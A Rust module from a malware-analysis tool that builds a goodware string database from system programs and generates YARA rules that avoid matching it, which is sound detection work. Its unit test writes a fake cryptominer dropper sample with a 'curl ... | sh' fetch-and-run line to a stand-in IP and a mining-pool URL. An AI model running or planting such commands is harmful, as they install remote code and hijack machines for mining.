//! `wpantry rules gen`: a YARA rule from samples, against this machine's
//! goodware.
//!
//! The goodware database is built here, from the system's own programs
//! (`/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, and the apps that ship with the
//! OS): every string and code snippet they contain, and in how many files.
//! It stays in the cache, on this machine. A generated rule keeps only what
//! the samples share and none of those files has, is checked against those
//! files once more after it compiles, and is marked unreviewed.

use crate::db::Cache;
use crate::error::Result;
use crate::utils::{files, os, parallel};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
pub use wpantry_yara::generate::Describe;
use wpantry_yara::generate::{self, Generated, Goodware};
use wpantry_yara::{Compiler, ScanOptions, Syntax};

pub const SCHEMA: &str = "
CREATE TABLE IF NOT EXISTS goodware (item BLOB PRIMARY KEY, files INTEGER);
CREATE TABLE IF NOT EXISTS goodware_files (path TEXT PRIMARY KEY);
";

/// Where goodware comes from, per system.
pub fn goodware_dirs() -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> =
        ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/libexec"].iter().map(PathBuf::from).collect();
    if cfg!(target_os = "macos") {
        dirs.push(PathBuf::from("/System/Applications"));
    }
    dirs
}

/// Files read into the goodware database, and the most of one read.
const MAX_GOODWARE_FILES: usize = 3000;
const MAX_FILE: u64 = 32 << 20;

/// The programs under `dirs` (app bundles' executables included), up to the cap.
pub fn goodware_files(dirs: &[PathBuf]) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for d in dirs {
        collect(d, 4, &mut out);
    }
    out.sort();
    out.truncate(MAX_GOODWARE_FILES);
    out
}

fn collect(dir: &Path, depth: usize, out: &mut Vec<PathBuf>) {
    let Ok(entries) = std::fs::read_dir(dir) else { return };
    for e in entries.flatten() {
        let Ok(ft) = e.file_type() else { continue };
        let p = e.path();
        if ft.is_dir() && depth > 0 {
            collect(&p, depth - 1, out);
        } else if ft.is_file() {
            out.push(p);
        }
    }
}

/// Rebuild the goodware database from `files`. Returns how many were read.
pub fn build(cache: &Cache, files: &[PathBuf], status: &dyn Fn(&str)) -> Result<usize> {
    cache.conn.execute("DELETE FROM goodware", [])?;
    cache.conn.execute("DELETE FROM goodware_files", [])?;
    let mut counts: HashMap<Vec<u8>, u64> = HashMap::new();
    let mut read = 0;
    for (i, f) in files.iter().enumerate() {
        if i % 100 == 0 {
            status(&format!("Reading goodware: {i} of {} files", files.len()));
        }
        let Ok(data) = files::read_capped_bytes(f, MAX_FILE) else { continue };
        read += 1;
        let mut items: Vec<Vec<u8>> = generate::strings(&data).into_iter().map(|s| s.bytes).collect();
        items.extend(generate::opcodes(&data));
        items.sort();
        items.dedup();
        for item in items {
            *counts.entry(item).or_default() += 1;
        }
        cache.conn.execute("INSERT OR REPLACE INTO goodware_files VALUES (?)", [f.to_string_lossy()])?;
    }
    status(&format!("Saving {} goodware strings", counts.len()));
    {
        let mut stmt = cache.conn.prepare("INSERT INTO goodware VALUES (?, ?)")?;
        for (item, n) in &counts {
            stmt.execute(rusqlite::params![item, *n as i64])?;
        }
    }
    cache.set("goodware:built", &format!("{}", os::now()))?;
    cache.commit()?;
    Ok(read)
}

/// The goodware database as the generator asks it.
pub struct Db<'a>(pub &'a Cache);

impl Goodware for Db<'_> {
    fn count(&self, item: &[u8]) -> u64 {
        self.0
            .conn
            .query_row("SELECT files FROM goodware WHERE item = ?", [item], |r| r.get::<_, i64>(0))
            .map_or(0, |n| n.max(0) as u64)
    }
}

/// Whether the goodware database has been built.
pub fn built(cache: &Cache) -> Result<bool> {
    Ok(cache.get("goodware:built")?.is_some())
}

/// What a generation run produced.
pub struct Output {
    pub rule: Generated,
    /// The goodware files the rule matched: none, for a usable rule.
    pub false_positives: Vec<PathBuf>,
    /// The rule's test file (`.test.toml`): the samples' hashes, and the
    /// goodware it must not match.
    pub test_toml: String,
}

/// Generate a rule from `samples` and check it against the goodware files.
pub fn run(cache: &Cache, samples: &[PathBuf], d: &Describe) -> Result<Option<Output>> {
    let data: Vec<Vec<u8>> = samples.iter().map(|s| files::read_capped_bytes(s, MAX_FILE)).collect::<Result<_>>()?;
    let refs: Vec<&[u8]> = data.iter().map(Vec::as_slice).collect();
    let Some(rule) = generate::generate(&refs, &Db(cache), d) else { return Ok(None) };
    let mut c = Compiler::new();
    c.add_source("generated", &rule.text, Syntax::Strict);
    let rules = c.build();
    let goodware: Vec<PathBuf> = {
        let mut stmt = cache.conn.prepare("SELECT path FROM goodware_files")?;
        stmt.query_map([], |r| r.get::<_, String>(0))?.filter_map(|p| p.ok().map(PathBuf::from)).collect()
    };
    let false_positives: Vec<PathBuf> = parallel::par_map(&goodware, parallel::cores(), |f| {
        let hit = files::read_capped_bytes(f, MAX_FILE)
            .is_ok_and(|b| !rules.scan(&b, &ScanOptions::default()).matches.is_empty());
        hit.then(|| f.clone())
    })
    .into_iter()
    .flatten()
    .collect();
    let test_toml = format!(
        "# Tests for {name}: every sample must match, no goodware file may.\nrule = \"{name}\"\nsamples_sha256 = [{hashes}]\ngoodware = [\"this machine's system programs ({n} files)\"]\nreviewed = false\n",
        name = d.name,
        hashes = d.hashes.iter().map(|h| format!("\"{h}\"")).collect::<Vec<_>>().join(", "),
        n = goodware.len(),
    );
    Ok(Some(Output { rule, false_positives, test_toml }))
}

/// A rule name from a family: letters, digits and `_`, starting with a letter.
pub fn rule_name(family: &str, category: &str) -> String {
    let clean = |s: &str| s.chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '_' }).collect::<String>();
    format!("Gen_{}_{}", clean(category), clean(family))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::utils::temp::TempDir;

    #[test]
    fn builds_goodware_and_generates_a_rule_that_avoids_it() {
        let d = TempDir::new("rulegen").unwrap();
        let cache = Cache::open(Some(&d.path().join("w.db"))).unwrap();
        let good_dir = d.path().join("good");
        std::fs::create_dir_all(good_dir.join("sub")).unwrap();
        std::fs::write(good_dir.join("tool"), b"#!/bin/sh\necho shared helper line\nusage: tool [options]\n").unwrap();
        std::fs::write(good_dir.join("sub/other"), b"#!/bin/sh\necho shared helper line\n").unwrap();
        let files = goodware_files(std::slice::from_ref(&good_dir));
        assert_eq!(files.len(), 2);
        assert!(!built(&cache).unwrap());
        let seen = std::cell::Cell::new(0);
        assert_eq!(build(&cache, &files, &|_| seen.set(seen.get() + 1)).unwrap(), 2);
        assert!(built(&cache).unwrap() && seen.get() >= 1);
        assert_eq!(Db(&cache).count(b"echo shared helper line"), 2);
        assert_eq!(Db(&cache).count(b"never seen"), 0);

        let sample = d.path().join("dropper.sh");
        std::fs::write(&sample, b"#!/bin/sh\necho shared helper line\npkill -f xmrig\ncurl -s http://203.0.113.9/x | sh\nPOOL=stratum+tcp://pool.example:3333\n").unwrap();
        let hashes = vec![crate::utils::sha256::hex(&std::fs::read(&sample).unwrap())];
        let name = rule_name("Test Kit", "miner");
        assert_eq!(name, "Gen_miner_Test_Kit");
        let describe = Describe {
            name: &name,
            category: "miner",
            family: "Test Kit",
            author: "t",
            reference: "r",
            date: "2026-11-04",
            hashes: &hashes,
        };
        let out = run(&cache, std::slice::from_ref(&sample), &describe).unwrap().unwrap();
        assert!(!out.rule.text.contains("shared helper line"), "goodware strings left out");
        assert!(out.rule.text.contains("stratum+tcp://pool.example:3333"));
        assert!(out.false_positives.is_empty());
        assert!(out.test_toml.contains(&hashes[0]) && out.test_toml.contains("reviewed = false"));
        // A sample with nothing beyond goodware yields no rule.
        let plain = d.path().join("plain.sh");
        std::fs::write(&plain, b"#!/bin/sh\necho shared helper line\n").unwrap();
        assert!(run(&cache, &[plain], &describe).unwrap().is_none());
        assert!(run(&cache, &[d.path().join("missing")], &describe).is_err());
        assert!(!goodware_dirs().is_empty());
    }
}
